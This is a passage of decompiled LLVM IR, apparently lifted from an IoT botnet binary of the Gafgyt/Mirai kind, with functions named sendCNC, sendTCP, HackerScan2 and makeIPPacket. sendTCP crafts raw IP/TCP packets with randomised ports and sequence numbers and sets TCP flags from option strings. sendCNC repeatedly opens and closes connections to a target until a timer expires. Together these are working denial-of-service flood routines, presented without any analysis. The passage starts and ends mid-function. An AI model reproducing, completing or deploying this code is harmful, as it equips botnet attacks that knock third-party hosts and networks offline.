  %v5_10588 = or i32 %v4_10588, %v3_10580
  store i32 %v5_10588, i32* %r3.global-to-local, align 4
  %v3_10594 = call i32 @csum(i8* %v4_1035c, i32 %v5_10588)
  %sext7 = mul i32 %v3_10594, 16777216
  %v1_10598 = sdiv i32 %sext7, 16777216
  store i32 %v1_10598, i32* %r3.global-to-local, align 4
  store i32 %v3_10300, i32* %r2.global-to-local, align 4
  %v1_105a0 = trunc i32 %v1_10598 to i8
  store i8 %v1_105a0, i8* %v4_10460, align 2
  %v0_105a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_105a441 = udiv i32 %v0_105a4, 256
  %v1_105a8 = trunc i32 %v3_105a441 to i8
  %v2_105a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_105a8 = add i32 %v2_105a8, 11
  %v4_105a8 = inttoptr i32 %v3_105a8 to i8*
  store i8 %v1_105a8, i8* %v4_105a8, align 1
  store i32 %stack_var_-100.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_105b4 = icmp eq i32 %stack_var_-100.0, %arg6
  br i1 %v9_105b4, label %dec_label_pc_105bc, label %dec_label_pc_105e0

dec_label_pc_105bc:                               ; preds = %dec_label_pc_10518
  %v2_105c0 = call i32 @__GI_time(i32* null)
  store i32 %v2_105c0, i32* %r2.global-to-local, align 4
  store i32 %v2_1047c, i32* %r3.global-to-local, align 4
  %v8_105d0 = icmp sgt i32 %v2_105c0, %v2_1047c
  br i1 %v8_105d0, label %dec_label_pc_105f0, label %dec_label_pc_105d4

dec_label_pc_105d4:                               ; preds = %dec_label_pc_105bc
  br label %dec_label_pc_10490

dec_label_pc_105e0:                               ; preds = %dec_label_pc_10518
  %v1_105e4 = add i32 %stack_var_-100.0, 1
  store i32 %v1_105e4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10490

dec_label_pc_105f0:                               ; preds = %dec_label_pc_105bc, %dec_label_pc_1022c, %dec_label_pc_101e0
  %v12_105f829 = phi i32 [ %v3_1023c, %dec_label_pc_1022c ], [ %v3_101f0, %dec_label_pc_101e0 ], [ %v2_105c0, %dec_label_pc_105bc ]
  br label %dec_label_pc_105f4

dec_label_pc_105f4:                               ; preds = %dec_label_pc_10180, %dec_label_pc_10028, %dec_label_pc_100b0, %dec_label_pc_10098, %dec_label_pc_105f0
  %v12_105f8 = phi i32 [ %v3_10038, %dec_label_pc_10028 ], [ 0, %dec_label_pc_100b0 ], [ %v3_100a8, %dec_label_pc_10098 ], [ %v12_105f829, %dec_label_pc_105f0 ], [ %v2_10184, %dec_label_pc_10180 ]
  store i32 %v3_ffac, i32* @r4, align 4
  store i32 %v6_ffac, i32* @fp, align 4
  ret i32 %v12_105f8

; uselistorder directives
  uselistorder i32 %v1_105e4, { 1, 0 }
  uselistorder i32 %v1_10598, { 1, 0 }
  uselistorder i32 %v3_10548, { 1, 0 }
  uselistorder i32 %v0_10530, { 1, 0 }
  uselistorder i32 %v3_10528, { 1, 0 }
  uselistorder i8 %v0_104e4.sink.off0, { 1, 0 }
  uselistorder i32 %v0_104e4, { 1, 0 }
  uselistorder i32 %v0_104b8, { 1, 0 }
  uselistorder i32 %stack_var_-100.0, { 0, 2, 1 }
  uselistorder i32 %v2_1047c, { 1, 0, 2 }
  uselistorder i32 %v3_10464, { 1, 0 }
  uselistorder i32 %v1_10458, { 1, 0 }
  uselistorder i32 %v1_1043c, { 0, 2, 1 }
  uselistorder i32 %v3_10504.pre-phi, { 1, 0 }
  uselistorder i8 %v0_103c0.sink.off0, { 1, 0 }
  uselistorder i32 %v3_103e0, { 2, 1, 0 }
  uselistorder i32 %v0_103c0, { 1, 0 }
  uselistorder i32 %v0_10394, { 1, 0 }
  uselistorder i32 %v3_1038c, { 1, 0 }
  uselistorder i32 %v1_10380, { 1, 0 }
  uselistorder i32 %v3_10374, { 1, 0 }
  uselistorder i32 %v3_10300, { 8, 6, 4, 7, 5, 2, 3, 13, 12, 11, 10, 9, 1, 0 }
  uselistorder i32 %v1_102d0, { 1, 0 }
  uselistorder i32 %v1_10288, { 1, 0 }
  uselistorder i32 %v1_101a8, { 1, 0 }
  uselistorder i32 %v3_10120, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v2_1010c, { 1, 0, 2 }
  uselistorder i32 %v1_100bc, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_10048, { 1, 0, 2 }
  uselistorder i32 %v3_1000c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 6, 7, 4, 5, 11, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 34, 37, 39, 38, 40, 41, 45, 42, 43, 44, 1, 46, 48, 47, 49, 50, 52, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 65, 67, 68, 69, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32 26, { 0, 2, 1 }
  uselistorder i32 49, { 0, 1, 3, 2 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_105f4, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10518, { 1, 0 }
  uselistorder label %dec_label_pc_103f4, { 1, 0 }
  uselistorder label %dec_label_pc_102cc, { 1, 0 }
  uselistorder label %dec_label_pc_10250, { 1, 0 }
  uselistorder label %dec_label_pc_10180, { 1, 0 }
  uselistorder label %dec_label_pc_10028, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10628 = call i32 @__GI_time(i32* null)
  %v2_10634 = add i32 %v2_10628, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_10644 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_10668 = urem i32 %arg2, 65536
  %v1_10670 = call i32 @htons(i32 %v3_10668)
  %v3_106b0 = bitcast i32* %stack_var_-40 to %sockaddr*
  br label %dec_label_pc_106c4

dec_label_pc_10688:                               ; preds = %dec_label_pc_106c4
  %v0_10694 = call i32 @socket()
  %v4_106b0 = call i32 @__libc_connect(i32 %v0_10694, %sockaddr* %v3_106b0, i32 16)
  %v1_106b8 = call i32 @sleep(i32 1)
  %v1_106c0 = call i32 @__libc_close(i32 %v0_10694)
  br label %dec_label_pc_106c4

dec_label_pc_106c4:                               ; preds = %entry, %dec_label_pc_10688
  %v2_106c8 = call i32 @__GI_time(i32* null)
  %v5_106d8 = icmp slt i32 %v2_106c8, %v2_10634
  br i1 %v5_106d8, label %dec_label_pc_10688, label %dec_label_pc_106dc

dec_label_pc_106dc:                               ; preds = %dec_label_pc_106c4
  ret i32 %v2_106c8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_106c4, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_106e8 = load i32, i32* @r4, align 4
  %v6_106e8 = load i32, i32* @fp, align 4
  store i32 67312, i32* %stack_var_-4, align 4
  %v2_106ec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_106ec, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_10728 = icmp eq i32 %arg2, 0
  br i1 %v2_10728, label %dec_label_pc_10730, label %dec_label_pc_10750

dec_label_pc_10730:                               ; preds = %entry
  %v0_10730 = call i32 @rand_cmwc()
  %v3_10738 = mul i32 %v0_10730, 65536
  store i32 %v3_10738, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10774

dec_label_pc_10750:                               ; preds = %entry
  %v3_10758 = urem i32 %arg2, 65536
  store i32 %v3_10758, i32* %r3.global-to-local, align 4
  %v1_10760 = call i32 @htons(i32 %v3_10758)
  br label %dec_label_pc_10774

dec_label_pc_10774:                               ; preds = %dec_label_pc_10730, %dec_label_pc_10750
  %v2_10778 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_10778, i32* %r3.global-to-local, align 4
  %v3_10784 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_10784, i32* %r3.global-to-local, align 4
  %v2_1078c = icmp eq i32 %v3_10784, 0
  br i1 %v2_1078c, label %dec_label_pc_10798, label %dec_label_pc_10d70

dec_label_pc_10798:                               ; preds = %dec_label_pc_10774
  %v2_10798 = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r2, align 4
  %v0_107bc = call i32 @socket()
  store i32 %v0_107bc, i32* %r3.global-to-local, align 4
  %v2_107cc = icmp eq i32 %v0_107bc, 0
  br i1 %v2_107cc, label %dec_label_pc_107d4, label %dec_label_pc_107ec

dec_label_pc_107d4:                               ; preds = %dec_label_pc_10798
  %v2_107d8 = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_107d8, i32* %r3.global-to-local, align 4
  %v3_107e4 = call i32 @HackerPrint(i32 %v2_107d8, i32 ptrtoint ([27 x i8]* @global_var_21700.1176 to i32))
  br label %dec_label_pc_10d70

dec_label_pc_107ec:                               ; preds = %dec_label_pc_10798
  store i32 1, i32* %stack_var_-68, align 4
  %v2_107f4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_107f4, i32* %r3.global-to-local, align 4
  %v6_10810 = call i32 @__GI_setsockopt(i32 %v0_107bc, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_10810, i32* %r3.global-to-local, align 4
  %v1_10818 = icmp slt i32 %v6_10810, 0
  br i1 %v1_10818, label %dec_label_pc_10820, label %dec_label_pc_10838

dec_label_pc_10820:                               ; preds = %dec_label_pc_107ec
  %v2_10824 = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_10824, i32* %r3.global-to-local, align 4
  %v3_10830 = call i32 @HackerPrint(i32 %v2_10824, i32 ptrtoint ([33 x i8]* @global_var_2171c.1178 to i32))
  br label %dec_label_pc_10d70

dec_label_pc_10838:                               ; preds = %dec_label_pc_107ec
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_1083c = icmp eq i32 %arg4, 0
  br i1 %v2_1083c, label %dec_label_pc_10868, label %dec_label_pc_10850

dec_label_pc_10850:                               ; preds = %dec_label_pc_10838
  %v1_10854 = sub i32 32, %arg4
  store i32 %v1_10854, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10860 = shl i32 -1, %v1_10854
  br label %dec_label_pc_10868

dec_label_pc_10868:                               ; preds = %dec_label_pc_10838, %dec_label_pc_10850
  %storemerge10 = phi i32 [ %v1_10860, %dec_label_pc_10850 ], [ 0, %dec_label_pc_10838 ]
  %v1_1086c = add i32 %arg6, 40
  %v1_1087c = add i32 %arg6, 46
  %v3_10880 = and i32 %v1_1087c, -4
  %v1_10888 = load i32, i32* @sp, align 4
  %v2_10888 = sub i32 %v1_10888, %v3_10880
  %v1_10898 = add i32 %v2_10888, 11
  %v3_1089c = and i32 %v1_10898, -4
  store i32 %v3_1089c, i32* %r2.global-to-local, align 4
  %v1_108bc = add i32 %v3_1089c, 20
  store i32 %v1_108bc, i32* %r3.global-to-local, align 4
  %v5_108c0 = inttoptr i32 %v1_108bc to i8*
  %v3_108c4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_108c4, i32* @r4, align 4
  %v1_108cc = call i32 @HackerScan2(i32 %storemerge10)
  store i32 %v1_108cc, i32* %r3.global-to-local, align 4
  %v1_108d8 = call i32 @htonl(i32 %v1_108cc)
  store i32 %v1_108d8, i32* %r2.global-to-local, align 4
  %v1_108e4 = add i32 %arg6, 20
  %v1_108e8 = load i32, i32* @sp, align 4
  %v2_108e8 = inttoptr i32 %v1_108e8 to i32*
  store i32 %v1_108e4, i32* %v2_108e8, align 4
  %v0_108f0 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_108f8 = inttoptr i32 %v3_1089c to i8*
  %v5_108f8 = call i32 @makeIPPacket(i8* %v4_108f8, i32 %v0_108f0, i32 %v1_108d8, i32 6)
  %v0_108fc = call i32 @rand_cmwc()
  %v3_10908 = urem i32 %v0_108fc, 65536
  store i32 %v3_10908, i32* %r3.global-to-local, align 4
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v1_10910 = trunc i32 %v0_108fc to i8
  store i8 %v1_10910, i8* %v5_108c0, align 4
  %v0_10914 = load i32, i32* %r3.global-to-local, align 4
  %v3_10914 = sdiv i32 %v0_10914, 256
  store i32 %v3_10914, i32* %r3.global-to-local, align 4
  %v1_10918 = trunc i32 %v3_10914 to i8
  %v2_10918 = load i32, i32* %r2.global-to-local, align 4
  %v3_10918 = add i32 %v2_10918, 1
  %v4_10918 = inttoptr i32 %v3_10918 to i8*
  store i8 %v1_10918, i8* %v4_10918, align 1
  %v0_1091c = call i32 @rand_cmwc()
  %v2_10928 = add i32 %v3_1089c, 24
  %v3_10928 = inttoptr i32 %v2_10928 to i32*
  store i32 %v0_1091c, i32* %v3_10928, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10934 = add i32 %v3_1089c, 28
  %v3_10934 = inttoptr i32 %v2_10934 to i32*
  store i32 0, i32* %v3_10934, align 4
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v1_1093c = add i32 %v3_1089c, 32
  %v2_1093c = inttoptr i32 %v1_1093c to i8*
  %v3_1093c = load i8, i8* %v2_1093c, align 4
  %v1_10948 = urem i8 %v3_1093c, 16
  %v1_1094c = or i8 %v1_10948, 80
  store i8 %v1_1094c, i8* %v2_1093c, align 4
  %v3_1095c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1095c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_21740.1183 to i32), i32* @r1, align 4
  %v3_10968 = inttoptr i32 %v3_1095c to i8*
  %v4_10968 = call i32 @__GI_strcoll(i8* %v3_10968, i32 ptrtoint ([4 x i8]* @global_var_21740.1183 to i32))
  store i32 %v4_10968, i32* %r3.global-to-local, align 4
  %v2_10970 = icmp eq i32 %v4_10968, 0
  br i1 %v2_10970, label %dec_label_pc_10978, label %dec_label_pc_109cc

dec_label_pc_10978:                               ; preds = %dec_label_pc_10868
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v1_1097c = add i32 %v3_1089c, 33
  %v2_1097c = inttoptr i32 %v1_1097c to i8*
  %v3_1097c = load i8, i8* %v2_1097c, align 1
  %v4_1097c = zext i8 %v3_1097c to i32
  %v1_10980 = or i32 %v4_1097c, 2
  store i32 %v1_10980, i32* %r3.global-to-local, align 4
  %v1_10984 = trunc i32 %v1_10980 to i8
  store i8 %v1_10984, i8* %v2_1097c, align 1
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v3_1098c = load i8, i8* %v2_1097c, align 1
  %v4_1098c = zext i8 %v3_1098c to i32
  %v1_10990 = or i32 %v4_1098c, 4
  store i32 %v1_10990, i32* %r3.global-to-local, align 4
  %v1_10994 = trunc i32 %v1_10990 to i8
  store i8 %v1_10994, i8* %v2_1097c, align 1
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v3_1099c = load i8, i8* %v2_1097c, align 1
  %v4_1099c = zext i8 %v3_1099c to i32
  %v1_109a0 = or i32 %v4_1099c, 1
  store i32 %v1_109a0, i32* %r3.global-to-local, align 4
  %v1_109a4 = trunc i32 %v1_109a0 to i8
  store i8 %v1_109a4, i8* %v2_1097c, align 1
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v3_109ac = load i8, i8* %v2_1097c, align 1
  %v4_109ac = zext i8 %v3_109ac to i32
  %v1_109b0 = or i32 %v4_109ac, 16
  store i32 %v1_109b0, i32* %r3.global-to-local, align 4
  %v1_109b4 = trunc i32 %v1_109b0 to i8
  store i8 %v1_109b4, i8* %v2_1097c, align 1
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v3_109bc = load i8, i8* %v2_1097c, align 1
  %v4_109bc = zext i8 %v3_109bc to i32
  %v1_109c0 = or i32 %v4_109bc, 8
  store i32 %v1_109c0, i32* %r3.global-to-local, align 4
  %v1_109c4 = trunc i32 %v1_109c0 to i8
  store i8 %v1_109c4, i8* %v2_1097c, align 1
  br label %dec_label_pc_10b10

dec_label_pc_109cc:                               ; preds = %dec_label_pc_10868
  %v3_109cc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_109cc, i32* %r3.global-to-local, align 4
  store i32 %v3_109cc, i32* @r0, align 4
  %v3_109d8 = call i32 @__GI_strtok(i32 %v3_109cc, i32* nonnull @global_var_21744.1185)
  store i32 %v3_109d8, i32* %r3.global-to-local, align 4
  %v2_10b0820 = icmp eq i32 %v3_109d8, 0
  br i1 %v2_10b0820, label %dec_label_pc_10b10, label %dec_label_pc_109e8.lr.ph

dec_label_pc_109e8.lr.ph:                         ; preds = %dec_label_pc_109cc
  %v1_10a08 = add i32 %v3_1089c, 33
  %v2_10a08 = inttoptr i32 %v1_10a08 to i8*
  br label %dec_label_pc_109e8

dec_label_pc_109e8:                               ; preds = %dec_label_pc_109e8.lr.ph, %dec_label_pc_10af0
  %storemerge1421 = phi i32 [ %v3_109d8, %dec_label_pc_109e8.lr.ph ], [ %v3_10af8, %dec_label_pc_10af0 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_21748.1187 to i32), i32* @r1, align 4
  %v3_109f4 = inttoptr i32 %storemerge1421 to i8*
  %v4_109f4 = call i32 @__GI_strcoll(i8* %v3_109f4, i32 ptrtoint ([4 x i8]* @global_var_21748.1187 to i32))
  store i32 %v4_109f4, i32* %r3.global-to-local, align 4
  %v2_109fc = icmp eq i32 %v4_109f4, 0
  br i1 %v2_109fc, label %dec_label_pc_10a04, label %dec_label_pc_10a18

dec_label_pc_10a04:                               ; preds = %dec_label_pc_109e8
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v3_10a08 = load i8, i8* %v2_10a08, align 1
  %v4_10a08 = zext i8 %v3_10a08 to i32
  %v1_10a0c = or i32 %v4_10a08, 2
  store i32 %v1_10a0c, i32* %r3.global-to-local, align 4
  %v1_10a10 = trunc i32 %v1_10a0c to i8
  store i8 %v1_10a10, i8* %v2_10a08, align 1
  br label %dec_label_pc_10af0

dec_label_pc_10a18:                               ; preds = %dec_label_pc_109e8
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_2174c.1189 to i32), i32* @r1, align 4
  %v4_10a24 = call i32 @__GI_strcoll(i8* %v3_109f4, i32 ptrtoint ([4 x i8]* @global_var_2174c.1189 to i32))
  store i32 %v4_10a24, i32* %r3.global-to-local, align 4
  %v2_10a2c = icmp eq i32 %v4_10a24, 0
  br i1 %v2_10a2c, label %dec_label_pc_10a34, label %dec_label_pc_10a48

dec_label_pc_10a34:                               ; preds = %dec_label_pc_10a18
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v3_10a38 = load i8, i8* %v2_10a08, align 1
  %v4_10a38 = zext i8 %v3_10a38 to i32
  %v1_10a3c = or i32 %v4_10a38, 4
  store i32 %v1_10a3c, i32* %r3.global-to-local, align 4
  %v1_10a40 = trunc i32 %v1_10a3c to i8
  store i8 %v1_10a40, i8* %v2_10a08, align 1
  br label %dec_label_pc_10af0

dec_label_pc_10a48:                               ; preds = %dec_label_pc_10a18
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_21750.1191 to i32), i32* @r1, align 4
  %v4_10a54 = call i32 @__GI_strcoll(i8* %v3_109f4, i32 ptrtoint ([4 x i8]* @global_var_21750.1191 to i32))
  store i32 %v4_10a54, i32* %r3.global-to-local, align 4
  %v2_10a5c = icmp eq i32 %v4_10a54, 0
  br i1 %v2_10a5c, label %dec_label_pc_10a64, label %dec_label_pc_10a78

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a48
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v3_10a68 = load i8, i8* %v2_10a08, align 1
  %v4_10a68 = zext i8 %v3_10a68 to i32
  %v1_10a6c = or i32 %v4_10a68, 1
  store i32 %v1_10a6c, i32* %r3.global-to-local, align 4
  %v1_10a70 = trunc i32 %v1_10a6c to i8
  store i8 %v1_10a70, i8* %v2_10a08, align 1
  br label %dec_label_pc_10af0

dec_label_pc_10a78:                               ; preds = %dec_label_pc_10a48
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_21754.1193 to i32), i32* @r1, align 4
  %v4_10a84 = call i32 @__GI_strcoll(i8* %v3_109f4, i32 ptrtoint ([4 x i8]* @global_var_21754.1193 to i32))
  store i32 %v4_10a84, i32* %r3.global-to-local, align 4
  %v2_10a8c = icmp eq i32 %v4_10a84, 0
  br i1 %v2_10a8c, label %dec_label_pc_10a94, label %dec_label_pc_10aa8

dec_label_pc_10a94:                               ; preds = %dec_label_pc_10a78
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v3_10a98 = load i8, i8* %v2_10a08, align 1
  %v4_10a98 = zext i8 %v3_10a98 to i32
  %v1_10a9c = or i32 %v4_10a98, 16
  store i32 %v1_10a9c, i32* %r3.global-to-local, align 4
  %v1_10aa0 = trunc i32 %v1_10a9c to i8
  store i8 %v1_10aa0, i8* %v2_10a08, align 1
  br label %dec_label_pc_10af0

dec_label_pc_10aa8:                               ; preds = %dec_label_pc_10a78
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_21758.1195 to i32), i32* @r1, align 4
  %v4_10ab4 = call i32 @__GI_strcoll(i8* %v3_109f4, i32 ptrtoint ([4 x i8]* @global_var_21758.1195 to i32))
  store i32 %v4_10ab4, i32* %r3.global-to-local, align 4
  %v2_10abc = icmp eq i32 %v4_10ab4, 0
  br i1 %v2_10abc, label %dec_label_pc_10ac4, label %dec_label_pc_10ad8

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_10aa8
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v3_10ac8 = load i8, i8* %v2_10a08, align 1
  %v4_10ac8 = zext i8 %v3_10ac8 to i32
  %v1_10acc = or i32 %v4_10ac8, 8
  store i32 %v1_10acc, i32* %r3.global-to-local, align 4
  %v1_10ad0 = trunc i32 %v1_10acc to i8
  store i8 %v1_10ad0, i8* %v2_10a08, align 1
  br label %dec_label_pc_10af0

dec_label_pc_10ad8:                               ; preds = %dec_label_pc_10aa8
  %v2_10adc = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_10adc, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_10aec = call i32 @HackerPrint(i32 %v2_10adc, i32 ptrtoint ([18 x i8]* @global_var_2175c.1197 to i32))
  br label %dec_label_pc_10af0

dec_label_pc_10af0:                               ; preds = %dec_label_pc_10ac4, %dec_label_pc_10a94, %dec_label_pc_10a64, %dec_label_pc_10a34, %dec_label_pc_10a04, %dec_label_pc_10ad8
  store i32 0, i32* @r0, align 4
  %v3_10af8 = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21744.1185)
  store i32 %v3_10af8, i32* %r3.global-to-local, align 4
  %v2_10b08 = icmp eq i32 %v3_10af8, 0
  br i1 %v2_10b08, label %dec_label_pc_10b10, label %dec_label_pc_109e8

dec_label_pc_10b10:                               ; preds = %dec_label_pc_10af0, %dec_label_pc_109cc, %dec_label_pc_10978
  %v0_10b10 = call i32 @rand_cmwc()
  %v3_10b1c = urem i32 %v0_10b10, 65536
  store i32 %v3_10b1c, i32* %r3.global-to-local, align 4
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v1_10b24 = trunc i32 %v0_10b10 to i8
  %v3_10b24 = add i32 %v3_1089c, 34
  %v4_10b24 = inttoptr i32 %v3_10b24 to i8*
  store i8 %v1_10b24, i8* %v4_10b24, align 2
  %v0_10b28 = load i32, i32* %r3.global-to-local, align 4
  %v3_10b2825 = udiv i32 %v0_10b28, 256
  %v1_10b2c = trunc i32 %v3_10b2825 to i8
  %v2_10b2c = load i32, i32* %r2.global-to-local, align 4
  %v3_10b2c = add i32 %v2_10b2c, 15
  %v4_10b2c = inttoptr i32 %v3_10b2c to i8*
  store i8 %v1_10b2c, i8* %v4_10b2c, align 1
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10b38 = add i32 %v3_1089c, 36
  %v4_10b38 = inttoptr i32 %v3_10b38 to i8*
  store i8 0, i8* %v4_10b38, align 4
  %v0_10b3c = load i32, i32* %r3.global-to-local, align 4
  %v1_10b3c = trunc i32 %v0_10b3c to i8
  %v2_10b3c = load i32, i32* %r2.global-to-local, align 4
  %v3_10b3c = add i32 %v2_10b3c, 17
  %v4_10b3c = inttoptr i32 %v3_10b3c to i8*
  store i8 %v1_10b3c, i8* %v4_10b3c, align 1
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10b48 = add i32 %v3_1089c, 38
  %v4_10b48 = inttoptr i32 %v3_10b48 to i8*
  store i8 0, i8* %v4_10b48, align 2
  %v0_10b4c = load i32, i32* %r3.global-to-local, align 4
  %v1_10b4c = trunc i32 %v0_10b4c to i8
  %v2_10b4c = load i32, i32* %r2.global-to-local, align 4
  %v3_10b4c = add i32 %v2_10b4c, 19
  %v4_10b4c = inttoptr i32 %v3_10b4c to i8*
  store i8 %v1_10b4c, i8* %v4_10b4c, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_10728, label %dec_label_pc_10b5c, label %dec_label_pc_10b74

dec_label_pc_10b5c:                               ; preds = %dec_label_pc_10b10
  %v0_10b5c = call i32 @rand_cmwc()
  %v3_10b64 = mul i32 %v0_10b5c, 65536
  store i32 %v3_10b64, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_10b5c to i8
  br label %dec_label_pc_10b90

dec_label_pc_10b74:                               ; preds = %dec_label_pc_10b10
  %v3_10b7c = urem i32 %arg2, 65536
  store i32 %v3_10b7c, i32* %r3.global-to-local, align 4
  %v1_10b84 = call i32 @htons(i32 %v3_10b7c)
  %extract.t71 = trunc i32 %v1_10b84 to i8
  br label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b5c, %dec_label_pc_10b74
  %v0_10b5c.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_10b5c ], [ %extract.t71, %dec_label_pc_10b74 ]
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v4_10b94 = sext i8 %v0_10b5c.sink.off0 to i32
  %v3_10b98 = add i32 %v3_1089c, 22
  %v4_10b98 = inttoptr i32 %v3_10b98 to i8*
  store i8 %v0_10b5c.sink.off0, i8* %v4_10b98, align 2
  %v3_10ba0 = sdiv i32 %v4_10b94, 256
  %v4_10ba0 = trunc i32 %v3_10ba0 to i8
  store i32 %v3_10ba0, i32* %r3.global-to-local, align 4
  %v4_10ba4 = add i32 %v3_1089c, 23
  %v5_10ba4 = inttoptr i32 %v4_10ba4 to i8*
  store i8 %v4_10ba0, i8* %v5_10ba4, align 1
  %v5_10bb0 = call i32 @tcpcsum(i32 %v3_1089c, i32 %v1_108bc, i32 %v1_108bc, i32 %v3_10ba0)
  %sext = mul i32 %v5_10bb0, 16777216
  %v1_10bb4 = sdiv i32 %sext, 16777216
  store i32 %v1_10bb4, i32* %r3.global-to-local, align 4
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v1_10bbc = trunc i32 %v1_10bb4 to i8
  store i8 %v1_10bbc, i8* %v4_10b38, align 4
  %v0_10bc0 = load i32, i32* %r3.global-to-local, align 4
  %v3_10bc028 = udiv i32 %v0_10bc0, 256
  %v1_10bc4 = trunc i32 %v3_10bc028 to i8
  %v2_10bc4 = load i32, i32* %r2.global-to-local, align 4
  %v3_10bc4 = add i32 %v2_10bc4, 17
  %v4_10bc4 = inttoptr i32 %v3_10bc4 to i8*
  store i8 %v1_10bc4, i8* %v4_10bc4, align 1
